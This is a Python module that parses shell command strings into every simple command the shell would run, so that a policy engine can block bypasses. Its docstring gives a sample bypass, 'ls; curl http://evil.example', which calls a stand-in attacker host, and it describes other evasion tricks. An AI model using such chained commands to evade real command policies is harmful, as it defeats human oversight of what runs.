"""
Shell Splitter — see every command the shell would run
=======================================================
The policy engine reads a *string*; /bin/sh interprets that string. If the two
disagree about what the string means, the policy can be bypassed (a "parse
differential"). The original engine looked only at the first word, so

    ls; curl http://evil.example

was judged to be `ls` (allowed) while the shell went on to run `curl`.

This module closes the gap by doing what the shell does first: it splits the
string into *simple commands* and the engine then checks every one of them
(the first blocked one blocks the whole string). It handles:

  - separators ; && || | |& & and newlines, and grouping ( ) { }
  - quoting and escapes ('literal', "double", backslash)
  - command substitution $(...), `...`, $((...)) and process substitution
    <(...) >(...), recursively; single-quoted text is literal
  - leading NAME=value assignments and shell keywords (if/then/do/!/...)
  - wrapper commands (env, nohup, timeout, nice, xargs, command, ...) so the
    real command underneath is seen
  - eval (its arguments are parsed as a command) and find -exec/-execdir/
    -ok/-okdir (the embedded command is returned as its own command)
  - redirection targets (> >> >| &> < ...), reported in `writes` / `reads`

Fail closed: anything this module cannot parse with confidence raises
ShellParseError, and the engine refuses it. That covers unbalanced quotes or
parentheses, unterminated substitutions, here-documents, ANSI-C quoting
($'...'), input longer than MAX_COMMAND_CHARS, nesting deeper than MAX_DEPTH,
and a command name that is only known at run time (`$X args`, `$(echo curl)`,
a glob such as `/usr/bin/cur*`).

A parse differential can go either way. Over-splitting (seeing a command the
shell does not run) is only an over-block, but UNDER-splitting is a bypass, and
comments are where the two meet: a word-initial `#` starts a comment that runs to
the end of the line, and any quote inside it is inert. The scanner therefore
skips comments exactly as the shell does (a `#` in the middle of a word, such as
`a#b` or `${#x}`, is ordinary text). A mistake here is NOT safe in either
direction: treating comment text as code can hide the next line inside a bogus
string (the 01-REVIEW CR-01 bypass).

Known limits (documented, not hidden): allow-listed interpreters (python3, pip)
can still run arbitrary code, and a string policy cannot see inside them;
unknown wrapper programs fall through to the policy's default action. The
namespace and seccomp layers remain the backstop for both.
"""

import os
import re
from dataclasses import dataclass, field
from typing import List, Optional

MAX_COMMAND_CHARS = 10000    # longest command string accepted
MAX_DEPTH = 8                # deepest nesting of $( ), backticks, eval

# Stands in for a substituted span inside a word. NUL cannot appear in a real
# shell command, and inputs that contain one are refused, so it is unambiguous.
_MARKER = '\x00'


class ShellParseError(ValueError):
    """The input cannot be parsed safely; the caller must refuse it."""


@dataclass
class SimpleCommand:
    """One command the shell would run."""
    text: str                                            # source text of this command
    argv: List[str] = field(default_factory=list)        # command name + arguments
    writes: List[str] = field(default_factory=list)      # output-redirection targets
    reads: List[str] = field(default_factory=list)       # input-redirection targets


_ASSIGNMENT = re.compile(r'[A-Za-z_][A-Za-z0-9_]*=')
_KEYWORDS = {'if', 'then', 'else', 'elif', 'fi', 'do', 'done',
             'while', 'until', '!', '{', '}'}
_FD_TARGET = re.compile(r'\d+-?|-')                      # `2>&1`, `>&-`: descriptor, not a file
_GLOB_CHARS = '*?[{}'


@dataclass
class _Word:
    text: str
    dynamic: bool = False      # contains an expansion ($, backtick, substitution)
    glob: bool = False         # contains an unquoted glob or brace character


class _Parser:
    """Single-pass, quote-aware scanner. One instance scans one string at one depth."""

    def __init__(self, source: str, depth: int, results: Optional[List[SimpleCommand]] = None):
        if depth > MAX_DEPTH:
            raise ShellParseError(f"nesting deeper than {MAX_DEPTH}")
        if len(source) > MAX_COMMAND_CHARS:
            raise ShellParseError(f"command longer than {MAX_COMMAND_CHARS} characters")
        if _MARKER in source:
            raise ShellParseError("NUL character in command")
        self.s = source
        self.depth = depth
        self.results: List[SimpleCommand] = results if results is not None else []
        self.paren_depth = 0
        self._reset_command(0)

    # ── per-command state ──

    def _reset_command(self, start: int):
        self.words: List[_Word] = []
        self.chars: List[str] = []
        self.dynamic = False
        self.glob = False
        self.in_word = False
        self.writes: List[str] = []
        self.reads: List[str] = []
        self.pending = None          # kind of redirection waiting for its target
        self.cmd_start = start

    def _add_text(self, text: str, dynamic: bool = False, glob: bool = False):
        self.chars.append(text)
        self.in_word = True
        self.dynamic = self.dynamic or dynamic
        self.glob = self.glob or glob

    def _end_word(self):
        if not self.in_word:
            return
        word = _Word(''.join(self.chars), self.dynamic, self.glob)
        self.chars, self.dynamic, self.glob, self.in_word = [], False, False, False
        if self.pending is None:
            self.words.append(word)
            return
        kind, self.pending = self.pending, None
        if kind == 'ignore':
            return
        if kind in ('dupw', 'dupr') and _FD_TARGET.fullmatch(word.text):
            return
        if word.dynamic:
            raise ShellParseError("dynamic redirect target")
        (self.writes if kind in ('w', 'dupw') else self.reads).append(word.text)

    def _flush(self, end: int, next_start: int):
        """A separator was reached: close the current simple command."""
        self._end_word()
        if self.pending is not None:
            raise ShellParseError("redirection without a target")
        words = self.words
        while words and (_ASSIGNMENT.match(words[0].text) or words[0].text in _KEYWORDS):
            words = words[1:]
        text = self.s[self.cmd_start:end].strip()
        if words:
            self.results.extend(_resolve(words, text, self.writes, self.reads, self.depth))
        elif self.writes or self.reads:
            self.results.append(SimpleCommand(text=text, writes=self.writes, reads=self.reads))
        self._reset_command(next_start)

    # ── substitutions ──

    def _substitution(self, i: int) -> int:
        """`$(` at index i (also `<(` / `>(`): parse the inside; return the index after `)`."""
        sub = _Parser(self.s, self.depth + 1, self.results)
        end = sub.scan(i + 2, nested=True)
        return end + 1

    def _backtick(self, i: int) -> int:
        """A backtick at index i: parse the inside; return the index after the closing one."""
        s, n, j, out = self.s, len(self.s), i + 1, []
        while True:
            if j >= n:
                raise ShellParseError("unterminated backtick substitution")
            c = s[j]
            if c == '`':
                break
            if c == '\\' and j + 1 < n:
                if s[j + 1] in '\\`$':
                    out.append(s[j + 1])
                else:
                    out.append(c + s[j + 1])
                j += 2
                continue
            out.append(c)
            j += 1
        _Parser(''.join(out), self.depth + 1, self.results).scan(0, nested=False)
        return j + 1

    # ── redirections ──

    def _redirect(self, i: int) -> int:
        """Handle a < or > at index i; return the index after the operator."""
        s = self.s
        # `2>file`: a purely numeric word glued to the operator is a descriptor
        if self.in_word and ''.join(self.chars).isdigit():
            self.chars, self.in_word, self.dynamic, self.glob = [], False, False, False
        else:
            self._end_word()
        if self.pending is not None:
            raise ShellParseError("redirection without a target")
        if s[i] == '>':
            if s.startswith('>>', i) or s.startswith('>|', i):
                self.pending, j = 'w', i + 2
            elif s.startswith('>&', i):
                self.pending, j = 'dupw', i + 2
            else:
                self.pending, j = 'w', i + 1
        else:
            if s.startswith('<<<', i):
                self.pending, j = 'ignore', i + 3          # here-string: data, not a file
            elif s.startswith('<<', i):
                raise ShellParseError("here-document is not supported")
            elif s.startswith('<&', i):
                self.pending, j = 'dupr', i + 2
            elif s.startswith('<>', i):
                self.pending, j = 'w', i + 2
            else:
                self.pending, j = 'r', i + 1
        return j

    # ── main scan ──

    def run(self) -> List[SimpleCommand]:
        self.scan(0, nested=False)
        return self.results

    def scan(self, i: int, nested: bool) -> int:
        """Scan from index i. When `nested`, stop at the `)` that closes the substitution
        and return its index; otherwise scan to the end of the string."""
        s, n = self.s, len(self.s)
        while i < n:
            c = s[i]
            if c == '\\':
                if i + 1 >= n:
                    raise ShellParseError("trailing backslash")
                if s[i + 1] != '\n':                      # backslash-newline is a continuation
                    self._add_text(s[i + 1])
                i += 2
            elif c == "'":
                j = s.find("'", i + 1)
                if j < 0:
                    raise ShellParseError("unbalanced single quote")
                self._add_text(s[i + 1:j])
                i = j + 1
            elif c == '"':
                i = self._double_quoted(i)
            elif c == '$':
                nxt = s[i + 1:i + 2]
                if nxt == '(':
                    i = self._substitution(i)
                    self._add_text(_MARKER, dynamic=True)
                elif nxt == "'":
                    raise ShellParseError("ANSI-C quoting ($'...') is not supported")
                else:
                    self._add_text('$', dynamic=True)
                    i += 1
            elif c == '`':
                i = self._backtick(i)
                self._add_text(_MARKER, dynamic=True)
            elif c == '#' and not self.in_word:
                # Comment: runs to end of line; quotes, ; and ) inside it are inert.
                # The newline itself is left for the separator branch.
                j = s.find('\n', i)
                i = n if j < 0 else j
            elif c in ' \t\r':
                self._end_word()
                i += 1
            elif c in ';\n':
                self._flush(i, i + 1)
                i += 1
            elif c == '&':
                if s.startswith('&>', i):                 # &> and &>> redirect both streams
                    self._end_word()
                    self.pending = 'w'
                    i += 3 if s.startswith('&>>', i) else 2
                else:
                    step = 2 if s.startswith('&&', i) else 1
                    self._flush(i, i + step)
                    i += step
            elif c == '|':
                step = 2 if s[i + 1:i + 2] in ('|', '&') else 1
                self._flush(i, i + step)
                i += step
            elif c == '(':
                self.paren_depth += 1
                self._flush(i, i + 1)
                i += 1
            elif c == ')':
                if self.paren_depth == 0:
                    if nested:
                        self._flush(i, i)
                        return i
                    raise ShellParseError("unbalanced parenthesis")
                self.paren_depth -= 1
                self._flush(i, i + 1)
                i += 1
            elif c in '<>' and s[i + 1:i + 2] == '(':
                i = self._substitution(i)                 # process substitution
                self._add_text(_MARKER, dynamic=True)
            elif c in '<>':
                i = self._redirect(i)
            else:
                self._add_text(c, glob=c in _GLOB_CHARS)
                i += 1
        if nested:
            raise ShellParseError("unterminated command substitution")
        if self.paren_depth:
            raise ShellParseError("unbalanced parenthesis")
        self._flush(n, n)
        return n

    def _double_quoted(self, i: int) -> int:
        """Consume a double-quoted span starting at index i; return the index after it."""
        s, n = self.s, len(self.s)
        j, out, dynamic = i + 1, [], False
        while True:
            if j >= n:
                raise ShellParseError("unbalanced double quote")
            d = s[j]
            if d == '"':
                break
            if d == '\\' and j + 1 < n:
                e = s[j + 1]
                if e in '$`"\\':
                    out.append(e)
                elif e != '\n':
                    out.append('\\' + e)
                j += 2
            elif d == '$' and s[j + 1:j + 2] == '(':
                j = self._substitution(j)
                out.append(_MARKER)
                dynamic = True
            elif d == '`':
                j = self._backtick(j)
                out.append(_MARKER)
                dynamic = True
            else:
                dynamic = dynamic or d == '$'
                out.append(d)
                j += 1
        self._add_text(''.join(out), dynamic=dynamic)
        return j + 1


# ── From words to commands: wrappers, eval, find -exec ──

def _skip_options(words: List[_Word], value_opts=(), positional: int = 0) -> List[_Word]:
    """Drop a wrapper's own name, its options (and their values) and `positional` operands."""
    i = 1
    while i < len(words) and words[i].text.startswith('-') and len(words[i].text) > 1:
        i += 2 if words[i].text in value_opts else 1
    return words[i + positional:] if i + positional <= len(words) else []


def _skip_env(words: List[_Word]) -> List[_Word]:
    i = 1
    while i < len(words):
        a = words[i].text
        if a == '-S' or a.startswith('-S') or a.startswith('--split-string'):
            raise ShellParseError("env -S is not supported")
        if a in ('-u', '--unset', '-C', '--chdir'):
            i += 2
        elif a.startswith('-') or _ASSIGNMENT.match(a):
            i += 1
        else:
            break
    return words[i:]


_WRAPPERS = {
    'env': _skip_env,
    'nohup': _skip_options,
    'command': _skip_options,
    'builtin': _skip_options,
    'exec': lambda w: _skip_options(w, value_opts=('-a',)),
    'time': _skip_options,
    'setsid': _skip_options,
    'nice': lambda w: _skip_options(w, value_opts=('-n', '--adjustment')),
    'ionice': lambda w: _skip_options(w, value_opts=('-c', '-n', '-p', '-P', '-u')),
    'stdbuf': lambda w: _skip_options(w, value_opts=('-i', '-o', '-e')),
    'timeout': lambda w: _skip_options(
        w, value_opts=('-s', '-k', '--signal', '--kill-after'), positional=1),
    'xargs': lambda w: _skip_options(
        w, value_opts=('-I', '-L', '-n', '-P', '-s', '-d', '-E', '-a',
                       '--max-args', '--max-procs', '--max-lines', '--max-chars',
                       '--delimiter', '--arg-file', '--eof')),
}

_FIND_EXEC = {'-exec', '-execdir', '-ok', '-okdir'}


def _unwrap(words: List[_Word]) -> List[_Word]:
    """Peel wrapper commands so `words` starts at the command that really runs."""
    while words:
        first = words[0]
        if first.dynamic or first.glob:
            return words
        handler = _WRAPPERS.get(os.path.basename(first.text))
        if handler is None:
            return words
        rest = handler(words)
        if not rest:
            return words            # e.g. a bare `env`: nothing underneath to expose
        words = rest
    return words


def _resolve(words: List[_Word], text: str, writes: List[str], reads: List[str],
             depth: int) -> List[SimpleCommand]:
    """Turn the words of one simple command into the commands that will actually run."""
    words = _unwrap(words)
    name = words[0]
    if name.dynamic or name.glob:
        raise ShellParseError("dynamic command name")
    base = os.path.basename(name.text)

    if base == 'eval':
        joined = ' '.join(w.text for w in words[1:])
        found = _Parser(joined, depth + 1).run() if joined.strip() else []
        if writes or reads:
            found.append(SimpleCommand(text=text, writes=writes, reads=reads))
        return found

    found = [SimpleCommand(text=text, argv=[w.text for w in words], writes=writes, reads=reads)]

    if base == 'find':
        i = 1
        while i < len(words):
            if words[i].text in _FIND_EXEC:
                j = i + 1
                while j < len(words) and words[j].text not in (';', '+'):
                    j += 1
                if j >= len(words) or j == i + 1:
                    raise ShellParseError(f"malformed find {words[i].text}")
                found.extend(_resolve(words[i + 1:j], text, [], [], depth))
                i = j
            i += 1
    return found


def parse_shell(command: str, _depth: int = 0) -> List[SimpleCommand]:
    """Return every simple command the shell would run for `command`.

    Raises ShellParseError for anything that cannot be parsed safely.
    """
    return _Parser(command, _depth).run()
